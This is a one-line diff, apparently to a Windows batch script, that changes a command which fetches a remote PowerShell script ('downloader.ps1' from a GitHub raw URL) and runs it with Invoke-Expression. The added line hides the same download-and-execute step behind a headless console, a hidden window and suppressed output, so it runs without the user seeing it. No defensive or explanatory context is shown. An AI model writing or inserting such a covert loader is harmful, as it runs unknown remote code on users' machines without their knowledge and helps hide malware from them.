@@ -1,1 +1,1 @@
-powershell -command Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/RaupenInspektor/Pico/main/downloader.ps1')
+start "" /b conhost.exe --headless powershell.exe -NoProfile -WindowStyle Hidden -Command "Invoke-Expression (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/RaupenInspektor/Pico/main/downloader.ps1').Content" >nul 2>&1
